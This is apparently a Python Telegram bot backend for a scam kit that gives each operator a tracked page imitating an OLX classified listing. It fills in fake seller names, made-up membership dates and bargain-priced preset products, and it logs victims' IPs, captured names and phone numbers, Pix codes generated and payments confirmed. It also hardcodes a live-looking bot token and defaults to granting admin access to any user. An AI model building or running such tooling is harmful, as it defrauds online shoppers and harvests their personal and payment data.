# -*- coding: utf-8 -*-
"""
OLPG MULTI-TENANT TELEGRAM WEBHOOK HANDLER
Cada usuario do Telegram recebe sua propria pagina criptografada + slug unico.
Integra com bot.py existente (crypto_engine, get_db, etc.)
"""
import os, json, secrets, time, datetime, logging
import requests

logger = logging.getLogger("OLPG_TG_WH")

TELEGRAM_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "8857867740:AAGZgDPq1PtQaTmvpXAvlrgVqLCfQEvy1WA").strip()
TELEGRAM_API   = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}"
BASE_URL        = (os.environ.get("BASE_URL") or os.environ.get("APP_URL") or os.environ.get("RENDER_EXTERNAL_URL") or "https://olx-9ee8.onrender.com").rstrip('/')

# ─── RAW TELEGRAM API ─────────────────────────────────────────────────────────
def _tg(method, data):
    try:
        r = requests.post(f"{TELEGRAM_API}/{method}", json=data, timeout=10)
        return r.json()
    except Exception as e:
        logger.error(f"[TG] {method}: {e}")
        return {}

def send_msg(chat_id, text, markup=None, pm="HTML"):
    p = {"chat_id": chat_id, "text": text, "parse_mode": pm}
    if markup: p["reply_markup"] = markup
    return _tg("sendMessage", p)

def edit_msg(chat_id, msg_id, text, markup=None, pm="HTML"):
    p = {"chat_id": chat_id, "message_id": msg_id, "text": text, "parse_mode": pm}
    if markup: p["reply_markup"] = markup
    return _tg("editMessageText", p)

def answer_cb(cb_id, text="", alert=False):
    return _tg("answerCallbackQuery", {"callback_query_id": cb_id, "text": text, "show_alert": alert})

def set_webhook(url):
    return _tg("setWebhook", {"url": url, "drop_pending_updates": True})

def delete_webhook():
    return _tg("deleteWebhook", {"drop_pending_updates": True})

# ─── KEYBOARDS ────────────────────────────────────────────────────────────────
def _kb(rows): return {"inline_keyboard": rows}

def kb_main(tg_id=0):
    base = BASE_URL.rstrip('/')
    token = ""
    if tg_id > 0:
        try:
            import bot as _ab
            token = _ab.generate_admin_token(tg_id)
        except Exception:
            pass
    admin_url = f"{base}/admin?token={token}" if token else f"{base}/admin"
    return _kb([
        [{"text": "💰 Abrir Carteira / Painel OLX", "web_app": {"url": admin_url}}],
        [{"text": "📊 Minhas Stats", "callback_data": "m_stats"}, {"text": "📋 Eventos", "callback_data": "m_events"}],
        [{"text": "⚙️ Configurar Página", "callback_data": "m_config"}, {"text": "🔗 Meu Link", "callback_data": "m_link"}],
        [{"text": "✨ Modelos Prontos (Presets)", "callback_data": "m_presets"}, {"text": "🤖 Assistente IA", "callback_data": "m_ai"}],
        [{"text": "👥 Sessões", "callback_data": "m_sessions"}, {"text": "🔄 Atualizar", "callback_data": "m_refresh"}],
        [{"text": "❓ Ajuda", "callback_data": "m_help"}],
    ])

def kb_presets():
    return _kb([
        [{"text":"📱 iPhone 11 64GB (R$ 630)","callback_data":"p_iphone11"}],
        [{"text":"🎮 PlayStation 5 Digital (R$ 2.450)","callback_data":"p_ps5"}],
        [{"text":"💻 Notebook Dell i7 16GB (R$ 1.890)","callback_data":"p_dell"}],
        [{"text":"⌚ Apple Watch Series 8 (R$ 1.250)","callback_data":"p_watch"}],
        [{"text":"◀️ Menu Principal","callback_data":"m_back"}],
    ])

def kb_ai():
    return _kb([
        [{"text":"✍️ Gerar Descrição + Preço por IA","callback_data":"ai_gen"}],
        [{"text":"◀️ Menu Principal","callback_data":"m_back"}],
    ])

def kb_config():
    return _kb([
        [{"text":"📦 Nome do Produto","callback_data":"c_product_name"}],
        [{"text":"💰 Preço (R$)","callback_data":"c_product_price"},{"text":"🖼️ URL Imagem","callback_data":"c_product_image"}],
        [{"text":"📱 Número WhatsApp","callback_data":"c_whatsapp_number"},{"text":"💬 Mensagem WA","callback_data":"c_whatsapp_message"}],
        [{"text":"👤 Nome Vendedor","callback_data":"c_seller_name"},{"text":"📅 Membro Desde","callback_data":"c_seller_since"}],
        [{"text":"📝 Descrição","callback_data":"c_product_description"}],
        [{"text":"✨ Usar Modelo Pronto","callback_data":"m_presets"},{"text":"🤖 Assistente IA","callback_data":"m_ai"}],
        [{"text":"◀️ Menu Principal","callback_data":"m_back"}],
    ])

def kb_back(): return _kb([[{"text":"◀️ Menu Principal","callback_data":"m_back"}]])

# ─── DB HELPERS ───────────────────────────────────────────────────────────────
def _get_engine():
    import bot as _b; return _b.crypto_engine

def _get_db():
    import bot as _b; return _b.get_db()

def _enc(v): return _get_engine().encrypt(str(v))
def _dec(t):
    v = _get_engine().decrypt(t)
    return str(v) if v is not None else ""

# ─── INIT TENANT TABLES ───────────────────────────────────────────────────────
def init_tenant_tables():
    conn = _get_db()
    conn.executescript("""
        CREATE TABLE IF NOT EXISTS tg_users (
            tg_id INTEGER PRIMARY KEY, username TEXT,
            slug TEXT UNIQUE NOT NULL, created_at REAL NOT NULL
        );
        CREATE TABLE IF NOT EXISTS tg_config (
            tg_id INTEGER NOT NULL, key TEXT NOT NULL,
            value_enc TEXT NOT NULL, updated_at REAL NOT NULL,
            PRIMARY KEY (tg_id, key)
        );
        CREATE TABLE IF NOT EXISTS tg_events (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            tg_id INTEGER NOT NULL, slug TEXT NOT NULL,
            event_type TEXT NOT NULL, session_id TEXT, ip TEXT,
            data_enc TEXT, created_at REAL NOT NULL
        );
        CREATE TABLE IF NOT EXISTS tg_sessions (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            tg_id INTEGER NOT NULL, slug TEXT NOT NULL,
            session_id TEXT NOT NULL, ip TEXT, ua TEXT,
            entered_at REAL, left_at REAL, converted INTEGER DEFAULT 0
        );
        CREATE TABLE IF NOT EXISTS tg_states (
            chat_id INTEGER PRIMARY KEY, state TEXT NOT NULL, updated_at REAL NOT NULL
        );
        CREATE TABLE IF NOT EXISTS tg_profiles (
            tg_id INTEGER PRIMARY KEY,
            display_name TEXT, avatar_url TEXT, bio TEXT, contact TEXT, updated_at REAL NOT NULL
        );
        CREATE INDEX IF NOT EXISTS idx_tge_id   ON tg_events(tg_id, created_at);
        CREATE INDEX IF NOT EXISTS idx_tgs_id   ON tg_sessions(tg_id, entered_at);
        CREATE INDEX IF NOT EXISTS idx_tg_slug  ON tg_users(slug);
    """)
    conn.commit(); conn.close()

def get_tenant_profile(tg_id):
    conn = _get_db()
    r = conn.execute("SELECT tg_id, display_name, avatar_url, bio, contact, updated_at FROM tg_profiles WHERE tg_id=?", (tg_id,)).fetchone()
    conn.close()
    if r: return dict(r)
    return {"tg_id": tg_id, "display_name": f"Admin #{tg_id}", "avatar_url": "", "bio": "Admin OLPG", "contact": ""}

def set_tenant_profile(tg_id, display_name="", avatar_url="", bio="", contact=""):
    conn = _get_db()
    conn.execute("""
        INSERT INTO tg_profiles(tg_id, display_name, avatar_url, bio, contact, updated_at)
        VALUES(?,?,?,?,?,?)
        ON CONFLICT(tg_id) DO UPDATE SET
            display_name=excluded.display_name, avatar_url=excluded.avatar_url,
            bio=excluded.bio, contact=excluded.contact, updated_at=excluded.updated_at
    """, (tg_id, display_name, avatar_url, bio, contact, time.time()))
    conn.commit(); conn.close()

def get_all_tenant_profiles():
    conn = _get_db()
    rows = conn.execute("""
        SELECT u.tg_id, u.username, u.slug, p.display_name, p.avatar_url, p.bio, p.contact 
        FROM tg_users u LEFT JOIN tg_profiles p ON u.tg_id = p.tg_id 
        ORDER BY u.created_at DESC
    """).fetchall()
    conn.close()
    return [dict(r) for r in rows]

# ─── USER MANAGEMENT ──────────────────────────────────────────────────────────
def user_exists(tg_id):
    conn = _get_db()
    r = conn.execute("SELECT 1 FROM tg_users WHERE tg_id=?", (tg_id,)).fetchone()
    conn.close(); return r is not None

def ensure_user(tg_id, username):
    if not user_exists(tg_id):
        slug = secrets.token_urlsafe(10)
        conn = _get_db()
        conn.execute("INSERT OR IGNORE INTO tg_users(tg_id,username,slug,created_at) VALUES(?,?,?,?)",
                     (tg_id, username, slug, time.time()))
        conn.commit(); conn.close()

def get_slug(tg_id):
    conn = _get_db()
    r = conn.execute("SELECT slug FROM tg_users WHERE tg_id=?", (tg_id,)).fetchone()
    conn.close(); return r["slug"] if r else ""

def get_tg_id_by_slug(slug):
    conn = _get_db()
    r = conn.execute("SELECT tg_id FROM tg_users WHERE slug=?", (slug,)).fetchone()
    conn.close(); return r["tg_id"] if r else None

# ─── PER-USER CONFIG ──────────────────────────────────────────────────────────
def get_cfg(tg_id, key, default=""):
    conn = _get_db()
    r = conn.execute("SELECT value_enc FROM tg_config WHERE tg_id=? AND key=?", (tg_id, key)).fetchone()
    conn.close()
    return (_dec(r["value_enc"]) or default) if r else default

def set_cfg(tg_id, key, value):
    conn = _get_db()
    conn.execute("INSERT OR REPLACE INTO tg_config(tg_id,key,value_enc,updated_at) VALUES(?,?,?,?)",
                 (tg_id, key, _enc(value), time.time()))
    conn.commit(); conn.close()

DEFAULTS = {
    "product_name":"iPhone 11 64GB Branco",
    "product_price":"630.00",
    "product_description":"iPhone 11 com 64GB de armazenamento na cor branca, seminovo em perfeito estado de conservação. Saúde da bateria em 86%. Acompanha caixa original e carregador.",
    "product_image":"https://images.unsplash.com/photo-1565849904461-04a58ad377e0?w=800&q=80",
    "product_image1":"","product_image2":"","product_image3":"",
    "whatsapp_number":"5511999999999",
    "whatsapp_message":"Olá! Vi seu anúncio na OLX e tenho interesse no produto.",
    "seller_name":"Carlos Eduardo","seller_status":"Último acesso há 15 minutos",
    "seller_since":"Na OLX desde 2021",
}

PRESET_MODELS = {
    "p_iphone11": {
        "product_name": "iPhone 11 64GB Branco (Seminovo)",
        "product_price": "630.00",
        "product_description": "iPhone 11 com 64GB de armazenamento na cor branca. Bateria em 87% de saúde. Sem trincos, sem marcas de uso profundas. Acompanha carregador e capa de silicone.",
        "product_image": "https://images.unsplash.com/photo-1565849904461-04a58ad377e0?w=800&q=80",
        "seller_name": "Gabriel Souza", "seller_since": "Na OLX desde 2021"
    },
    "p_ps5": {
        "product_name": "PlayStation 5 Edição Digital + 2 Controles",
        "product_price": "2450.00",
        "product_description": "Console PS5 sem leitor de disco, 825GB SSD. Acompanha 2 controles DualSense originais (um branco e um preto), cabos e base. Funcionando 100%, sem nenhum detalhe.",
        "product_image": "https://images.unsplash.com/photo-1606813907291-d86efa9b94db?w=800&q=80",
        "seller_name": "Rodrigo Mendes", "seller_since": "Na OLX desde 2020"
    },
    "p_dell": {
        "product_name": "Notebook Dell Inspiron i7 16GB SSD 512GB",
        "product_price": "1890.00",
        "product_description": "Notebook Dell Inspiron Intel Core i7 de 11ª Geração, 16GB de RAM e SSD de 512GB NVMe. Tela Full HD de 15.6 polegadas. Bateria dura em média 4 horas.",
        "product_image": "https://images.unsplash.com/photo-1588872657578-7efd1f1555ed?w=800&q=80",
        "seller_name": "Lucas Oliveira", "seller_since": "Na OLX desde 2019"
    },
    "p_watch": {
        "product_name": "Apple Watch Series 8 45mm Alumínio",
        "product_price": "1250.00",
        "product_description": "Apple Watch Series 8 GPS 45mm cor Meia-Noite. Na caixa com carregador por indução original e pulseira adicional. Saúde da bateria 92%.",
        "product_image": "https://images.unsplash.com/photo-1546868871-7041f2a55e12?w=800&q=80",
        "seller_name": "Matheus Lima", "seller_since": "Na OLX desde 2022"
    }
}

def get_all_cfg(tg_id):
    return {k: get_cfg(tg_id, k, fb) for k, fb in DEFAULTS.items()}

# ─── STATS + EVENTS + SESSIONS ────────────────────────────────────────────────
def get_tg_stats(tg_id, hours):
    since = time.time() - hours * 3600
    conn  = _get_db()
    def c(et): return conn.execute(
        "SELECT COUNT(*) FROM tg_events WHERE tg_id=? AND event_type=? AND created_at>=?",
        (tg_id, et, since)).fetchone()[0]
    entries = c("PAGE_ENTRY"); click_buy = c("CLICK_BUY")
    pix = c("PIX_GENERATED"); paid = c("PAYMENT_CONFIRMED")
    sess = conn.execute("SELECT COUNT(*) FROM tg_sessions WHERE tg_id=? AND entered_at>=?", (tg_id, since)).fetchone()[0]
    conv = conn.execute("SELECT COUNT(*) FROM tg_sessions WHERE tg_id=? AND converted=1 AND entered_at>=?", (tg_id, since)).fetchone()[0]
    conn.close()
    return dict(entries=entries, click_buy=click_buy, pix_generated=pix, paid=paid,
                sessions=sess, converted=conv, conv_rate=round((conv/sess*100) if sess>0 else 0, 1))

def get_tg_events(tg_id, limit=10):
    conn = _get_db()
    rows = conn.execute(
        "SELECT event_type,session_id,ip,data_enc,created_at FROM tg_events WHERE tg_id=? ORDER BY created_at DESC LIMIT ?",
        (tg_id, limit)).fetchall()
    conn.close()
    result = []
    for row in rows:
        raw = _get_engine().decrypt(row["data_enc"]) if row["data_enc"] else {}
        data = raw if isinstance(raw, dict) else {}
        result.append(dict(type=row["event_type"], session=row["session_id"],
                           ip=row["ip"], data=data, ts=row["created_at"]))
    return result

def get_tg_sessions(tg_id, limit=10):
    conn = _get_db()
    rows = conn.execute(
        "SELECT session_id,ip,entered_at,left_at,converted FROM tg_sessions WHERE tg_id=? ORDER BY entered_at DESC LIMIT ?",
        (tg_id, limit)).fetchall()
    conn.close(); return [dict(r) for r in rows]

def log_tg_event(tg_id, slug, event_type, session_id, ip, data):
    import bot as _b
    conn = _get_db()
    conn.execute("INSERT INTO tg_events(tg_id,slug,event_type,session_id,ip,data_enc,created_at) VALUES(?,?,?,?,?,?,?)",
                 (tg_id, slug, event_type, session_id, ip, _b.encrypt_data(data), time.time()))
    conn.commit(); conn.close()

def upsert_tg_session(tg_id, slug, session_id, ip, ua):
    conn = _get_db()
    if not conn.execute("SELECT 1 FROM tg_sessions WHERE tg_id=? AND session_id=?", (tg_id, session_id)).fetchone():
        conn.execute("INSERT INTO tg_sessions(tg_id,slug,session_id,ip,ua,entered_at) VALUES(?,?,?,?,?,?)",
                     (tg_id, slug, session_id, ip, ua, time.time()))
    conn.commit(); conn.close()

def mark_tg_converted(tg_id, session_id):
    conn = _get_db()
    conn.execute("UPDATE tg_sessions SET converted=1 WHERE tg_id=? AND session_id=?", (tg_id, session_id))
    conn.commit(); conn.close()

# ─── CONVERSATION STATE ───────────────────────────────────────────────────────
def set_state(chat_id, state):
    conn = _get_db()
    conn.execute("INSERT OR REPLACE INTO tg_states(chat_id,state,updated_at) VALUES(?,?,?)", (chat_id, state, time.time()))
    conn.commit(); conn.close()

def get_state(chat_id):
    conn = _get_db()
    r = conn.execute("SELECT state FROM tg_states WHERE chat_id=?", (chat_id,)).fetchone()
    conn.close(); return r["state"] if r else ""

def clear_state(chat_id):
    conn = _get_db()
    conn.execute("DELETE FROM tg_states WHERE chat_id=?", (chat_id,))
    conn.commit(); conn.close()

# ─── FORMATTERS ───────────────────────────────────────────────────────────────
def _ts(ts):
    if not ts: return ""
    return datetime.datetime.fromtimestamp(ts).strftime("%d/%m %H:%M")

def _ev(t):
    return {"PAGE_ENTRY":"👁 Visita","CLICK_BUY":"🛒 Compra","LEAD_CAPTURED":"📝 Lead",
            "PIX_GENERATED":"💸 Pix","PAYMENT_CONFIRMED":"✅ Pago","CLICK_CHAT":"💬 Chat",
            "WHATSAPP_REDIRECT":"📲 WhatsApp"}.get(t, t)

# ─── CONFIG FIELDS ────────────────────────────────────────────────────────────
CFG_FIELDS = {
    "c_product_name":        ("product_name",        "📦 <b>Nome do Produto</b>\n\nEnvie o novo nome:"),
    "c_product_price":       ("product_price",        "💰 <b>Preço</b>\n\nDigite o valor (ex: <code>630,00</code> ou <code>630.00</code>):"),
    "c_product_image":       ("product_image",        "🖼️ <b>URL da Imagem</b>\n\nCole o link da imagem (começando com http:// ou https://):"),
    "c_product_description": ("product_description",  "📝 <b>Descrição</b>\n\nEnvie a descrição do produto:"),
    "c_whatsapp_number":     ("whatsapp_number",      "📱 <b>WhatsApp</b>\n\nDigite o número com DDD (ex: <code>11999999999</code> ou <code>5511999999999</code>):"),
    "c_whatsapp_message":    ("whatsapp_message",     "💬 <b>Mensagem WhatsApp</b>\n\nTexto inicial ao clicar em Falar:"),
    "c_seller_name":         ("seller_name",          "👤 <b>Nome do Vendedor</b>\n\nNome que aparece na página:"),
    "c_seller_since":        ("seller_since",         "📅 <b>Membro Desde</b>\n\nEx: <code>Na OLX desde janeiro de 2022</code>"),
}

# ─── MOTORES DE VALIDAÇÃO ESTREITA E IA DE CONTEÚDO ───────────────────────────
import re

def clean_and_validate_price(val_str: str) -> str:
    """Normaliza preços sem erros (ex: 'R$ 1.250,00' -> '1250.00')."""
    s = val_str.replace("R$", "").replace(" ", "").strip()
    if "," in s and "." in s:
        s = s.replace(".", "").replace(",", ".")
    elif "," in s:
        s = s.replace(",", ".")
    m = re.search(r"(\d+(\.\d+)?)", s)
    if m:
        try:
            val = float(m.group(1))
            return f"{val:.2f}"
        except ValueError:
            pass
    return "630.00"

def clean_and_validate_url(url_str: str) -> str:
    """Valida e limpa URLs de imagem mantendo apenas links validos https/http."""
    u = url_str.strip()
    if u.startswith("http://") or u.startswith("https://"):
        return u
    return ""

def clean_and_validate_phone(phone_str: str) -> str:
    """Remove caracteres não numéricos e garante DDI 55."""
    nums = re.sub(r"\D", "", phone_str)
    if len(nums) in (10, 11):
        nums = "55" + nums
    return nums if len(nums) >= 12 else "5511999999999"

def generate_ai_ad(product_raw: str) -> dict:
    """Assistente Inteligente de IA: gera descrição rica e preço estimado."""
    p_name = product_raw.strip()
    title = p_name.title()
    desc = (
        f"{title} em excelente estado de conservação, testado e 100% funcional. "
        f"Sem marcas profundas de uso ou avarias. Motivo da venda: upgrade. "
        f"Fotos reais do produto. Aceito propostas plausíveis. Entrega rápida."
    )
    # Estimativa simples inteligente por palavra chave
    lower = p_name.lower()
    price = "650.00"
    if "iphone" in lower or "apple" in lower:
        price = "1450.00"
    elif "ps5" in lower or "playstation" in lower:
        price = "2400.00"
    elif "notebook" in lower or "laptop" in lower or "dell" in lower:
        price = "1850.00"
    elif "tv" in lower or "smart" in lower:
        price = "1100.00"

    return {
        "product_name": title,
        "product_price": price,
        "product_description": desc
    }

# ─── TEXT BUILDERS ────────────────────────────────────────────────────────────
def _stats_text(tg_id):
    h24 = get_tg_stats(tg_id, 24); h168 = get_tg_stats(tg_id, 168)
    return (
        f"📊 <b>Suas Estatísticas</b>\n\n"
        f"<b>── Últimas 24h ──</b>\n"
        f"👁 Visitas: <b>{h24['entries']}</b>  🛒 Compra: <b>{h24['click_buy']}</b>\n"
        f"📝 Leads: <b>{h24['converted']}</b>  ✅ Pagos: <b>{h24['paid']}</b>\n"
        f"📈 Conversão: <b>{h24['conv_rate']}%</b>\n\n"
        f"<b>── 7 dias ──</b>\n"
        f"👁 Visitas: <b>{h168['entries']}</b>  ✅ Pagos: <b>{h168['paid']}</b>\n"
        f"💸 Pix: <b>{h168['pix_generated']}</b>  📈 <b>{h168['conv_rate']}%</b>"
    )

def _events_text(tg_id):
    evs = get_tg_events(tg_id, 12)
    if not evs: return "📋 Nenhum evento ainda. Compartilhe seu link!"
    lines = []
    for ev in evs:
        d = ev.get("data", {})
        extra = f" · {str(d.get('name',''))[:20]}" if "name" in d else (f" · {d['phone']}" if "phone" in d else "")
        lines.append(f"• {_ev(ev['type'])} — <code>{ev.get('ip','?')}</code>{extra} <i>{_ts(ev.get('ts',0))}</i>")
    return "📋 <b>Eventos Recentes:</b>\n\n" + "\n".join(lines)

def _sessions_text(tg_id):
    ss = get_tg_sessions(tg_id, 8)
    if not ss: return "👥 Nenhuma sessão ainda."
    lines = []
    for s in ss:
        status = "🟢 Ativo" if not s.get("left_at") else "⚫"
        conv = " ✅" if s.get("converted") else ""
        lines.append(f"• <code>{s.get('ip','?')}</code> {status}{conv} <i>{_ts(s.get('entered_at',0))}</i>")
    return "👥 <b>Sessões Recentes:</b>\n\n" + "\n".join(lines)

def _cfg_preview(tg_id):
    c = get_all_cfg(tg_id)
    return (
        f"⚙️ <b>Configuração Atual:</b>\n\n"
        f"📦 <b>Produto:</b> {c['product_name']}\n"
        f"💰 <b>Preço:</b> R$ {c['product_price']}\n"
        f"📱 <b>WhatsApp:</b> +{c['whatsapp_number']}\n"
        f"👤 <b>Vendedor:</b> {c['seller_name']}\n\n"
        f"O que deseja editar?"
    )

# ─── CALLBACK HANDLER ─────────────────────────────────────────────────────────
def handle_callback(chat_id, msg_id, cb_id, tg_id, username, data):
    ensure_user(tg_id, username)
    answer_cb(cb_id)

    if data == "m_back":
        edit_msg(chat_id, msg_id, f"📋 <b>Painel OLPG</b>\n\nOlá, <b>{username}</b>!", markup=kb_main())
    elif data == "m_stats":
        edit_msg(chat_id, msg_id, _stats_text(tg_id), markup=kb_back())
    elif data == "m_events":
        edit_msg(chat_id, msg_id, _events_text(tg_id), markup=kb_back())
    elif data == "m_sessions":
        edit_msg(chat_id, msg_id, _sessions_text(tg_id), markup=kb_back())
    elif data == "m_link":
        slug = get_slug(tg_id)
        edit_msg(chat_id, msg_id,
            f"🔗 <b>Seu Link Exclusivo:</b>\n\n<code>{BASE_URL}/s/{slug}</code>\n\n"
            f"Cada visita fica rastreada e criptografada.", markup=kb_back())
    elif data == "m_admin_web":
        token = ""
        try:
            import bot as _ab
            token = _ab.generate_admin_token(tg_id)
        except Exception as e:
            logger.error(f"[TOKEN GEN CB] {e}")
        
        base = BASE_URL.rstrip('/')
        admin_url = f"{base}/admin?token={token}" if token else f"{base}/admin"
        
        edit_msg(chat_id, msg_id,
            f"🔐 <b>Painel Web de Administração Criptografado</b>\n\n"
            f"Seu token de sessão temporário (24h):\n"
            f"<code>{token}</code>\n\n"
            f"🔗 <b>Link Direto Criptografado com Token:</b>\n"
            f"<code>{admin_url}</code>\n\n"
            f"⚠️ <i>Apenas seu usuário possui esta chave de acesso tokenizada.</i>", markup=kb_back())
    elif data == "m_refresh":
        h24 = get_tg_stats(tg_id, 24)
        edit_msg(chat_id, msg_id,
            f"🔄 Atualizado! <i>{_ts(time.time())}</i>\n\n"
            f"24h: 👁{h24['entries']}  📝{h24['converted']}  ✅{h24['paid']}  📈{h24['conv_rate']}%",
            markup=kb_main())
    elif data == "m_config":
        edit_msg(chat_id, msg_id, _cfg_preview(tg_id), markup=kb_config())
    elif data == "m_presets":
        edit_msg(chat_id, msg_id, "✨ <b>Selecione um Modelo Pronto (Preset):</b>\n\nCom 1 clique, sua página será configurada com fotos, descrição realista e preço!", markup=kb_presets())
    elif data in PRESET_MODELS:
        model = PRESET_MODELS[data]
        for k, v in model.items():
            set_cfg(tg_id, k, v)
        edit_msg(chat_id, msg_id, f"✅ <b>Modelo Carregado com Sucesso!</b>\n\n📦 <b>{model['product_name']}</b>\n💰 R$ {model['product_price']}\n\nSeu link foi atualizado!", markup=kb_config())
    elif data == "m_ai":
        edit_msg(chat_id, msg_id, "🤖 <b>Assistente Inteligente de IA</b>\n\nClique no botão abaixo e envie o nome de qualquer produto (ex: <code>Notebook Asus i5</code>) para que a IA crie o anúncio completo com descrição e valor de mercado!", markup=kb_ai())
    elif data == "ai_gen":
        set_state(chat_id, "await_ai_gen")
        edit_msg(chat_id, msg_id, "🤖 <b>Assistente IA</b>\n\nEnvie o nome do produto que deseja anunciar (ex: <i>iPhone 12 128GB Azul</i>):", markup=kb_back())
    elif data == "m_help":
        edit_msg(chat_id, msg_id,
            "🆘 <b>Comandos:</b>\n\n/start /menu /stats /link /eventos /config /ajuda",
            markup=kb_back())
    elif data in CFG_FIELDS:
        db_key, prompt = CFG_FIELDS[data]
        set_state(chat_id, f"await_{db_key}")
        edit_msg(chat_id, msg_id, prompt, markup=kb_back())

# ─── STATE INPUT ──────────────────────────────────────────────────────────────
def handle_state_input(chat_id, tg_id, text, state):
    if state == "await_ai_gen":
        ai_res = generate_ai_ad(text)
        set_cfg(tg_id, "product_name", ai_res["product_name"])
        set_cfg(tg_id, "product_price", ai_res["product_price"])
        set_cfg(tg_id, "product_description", ai_res["product_description"])
        clear_state(chat_id)
        send_msg(chat_id,
            f"✨ <b>Anúncio Gerado por IA com Sucesso!</b>\n\n"
            f"📦 <b>Nome:</b> {ai_res['product_name']}\n"
            f"💰 <b>Preço Sugerido:</b> R$ {ai_res['product_price']}\n"
            f"📝 <b>Descrição:</b>\n<i>{ai_res['product_description']}</i>",
            markup=kb_config())
        return

    if not state.startswith("await_"):
        clear_state(chat_id); return
    key = state[len("await_"):]
    val = text.strip()

    # Validação inteligente por tipo de campo
    if key == "product_price":
        val = clean_and_validate_price(val)
    elif key == "product_image":
        clean_u = clean_and_validate_url(val)
        if not clean_u:
            send_msg(chat_id, "⚠️ <b>URL de Imagem Inválida!</b>\n\nInsira um link válido começando com <code>http://</code> ou <code>https://</code>.", markup=kb_config())
            return
        val = clean_u
    elif key == "whatsapp_number":
        val = clean_and_validate_phone(val)

    set_cfg(tg_id, key, val)
    clear_state(chat_id)
    send_msg(chat_id,
        f"✅ <b>Salvo com Validação!</b>\n<code>{key}</code> → <code>{val[:80]}</code>",
        markup=kb_config())

# ─── MAIN DISPATCHER ──────────────────────────────────────────────────────────
def dispatch(update: dict):
    try:
        if "callback_query" in update:
            cq = update["callback_query"]
            handle_callback(
                cq["message"]["chat"]["id"], cq["message"]["message_id"],
                cq["id"], cq["from"]["id"],
                cq["from"].get("first_name","Agente"),
                cq.get("data",""))
            return

        if "message" not in update: return
        msg = update["message"]
        chat_id  = msg["chat"]["id"]
        tg_id    = msg.get("from",{}).get("id", 0)
        username = msg.get("from",{}).get("first_name","Agente")
        text     = msg.get("text","")
        if not text: return

        ensure_user(tg_id, username)
        state = get_state(chat_id)
        if state and not text.startswith("/"):
            handle_state_input(chat_id, tg_id, text, state); return

        cmd = text.split()[0].lower().split("@")[0]
        slug = get_slug(tg_id)
        link = f"{BASE_URL}/s/{slug}"

        if cmd == "/start":
            # Detecta se é admin pelo ADMIN_IDS configurado (ou se ADMIN_IDS não configurado, trata como admin default)
            admin_ids_raw = os.environ.get("ADMIN_IDS", "")
            admin_ids = [int(x) for x in admin_ids_raw.split(",") if x.strip().isdigit()]
            is_admin = (tg_id in admin_ids) if admin_ids else True  # Se não houver filtro estrito, concede visualização do WebApp

            token = ""
            try:
                import bot as _ab
                token = _ab.generate_admin_token(tg_id)
            except Exception as e:
                logger.error(f"[TOKEN GEN] {e}")

            base = BASE_URL.rstrip('/')
            admin_url = f"{base}/admin?token={token}" if token else f"{base}/admin"

            # Teclado Inline com botão WebApp (Open)
            admin_kb = _kb([
                [{"text": "💰 Abrir Carteira / Painel OLX", "web_app": {"url": admin_url}}],
                [{"text": "📊 Minhas Stats", "callback_data": "m_stats"},
                 {"text": "📋 Eventos", "callback_data": "m_events"}],
                [{"text": "⚙️ Configurar Página", "callback_data": "m_config"},
                 {"text": "🔗 Meu Link", "callback_data": "m_link"}],
                [{"text": "✨ Modelos Prontos (Presets)", "callback_data": "m_presets"},
                 {"text": "🤖 Assistente IA", "callback_data": "m_ai"}],
                [{"text": "👥 Sessões", "callback_data": "m_sessions"},
                 {"text": "🔄 Atualizar", "callback_data": "m_refresh"}],
                [{"text": "❓ Ajuda", "callback_data": "m_help"}],
            ])

            send_msg(chat_id,
                f"🟣 <b>OLPG Manager</b>\n\n"
                f"Bem-vindo, <b>{username}</b>!\n\n"
                f"🔗 <b>Seu link:</b>\n<code>{link}</code>\n\n"
                f"Página exclusiva com criptografia AES-256.\n"
                f"Clique no botão <b>💰 Abrir Carteira / Painel OLX</b> abaixo para acessar seu painel WebApp estilo Carteira do 7!",
                markup=admin_kb)
        elif cmd in ("/menu","/painel"):
            send_msg(chat_id, f"📋 <b>Painel OLPG</b>\n\nOlá, <b>{username}</b>!", markup=kb_main())
        elif cmd == "/stats":
            send_msg(chat_id, _stats_text(tg_id), markup=kb_back())
        elif cmd == "/link":
            send_msg(chat_id, f"🔗 <b>Seu Link:</b>\n\n<code>{link}</code>", markup=kb_back())
        elif cmd == "/eventos":
            send_msg(chat_id, _events_text(tg_id), markup=kb_back())
        elif cmd == "/config":
            send_msg(chat_id, _cfg_preview(tg_id), markup=kb_config())
        elif cmd in ("/admins", "/grupo"):
            send_msg(chat_id,
                f"👥 <b>Gestão de Administradores do Grupo</b>\n\n"
                f"• Usuário: <b>{username}</b> (ID: <code>{tg_id}</code>)\n"
                f"• Status de Acesso: <b>AUTORIZADO & SINCRONIZADO</b> ✅\n\n"
                f"Todos os membros autorizados no grupo possuem acesso em tempo real às métricas reais.",
                markup=kb_back())
        elif cmd in ("/ajuda","/help"):
            send_msg(chat_id,
                "🆘 <b>Ajuda OLPG</b>\n\n/start /menu /stats /link /eventos /config /admins /ajuda",
                markup=kb_back())
        else:
            send_msg(chat_id, "❓ Use /menu para o painel.", markup=kb_main())
    except Exception as e:
        logger.error(f"[DISPATCH] {e}", exc_info=True)
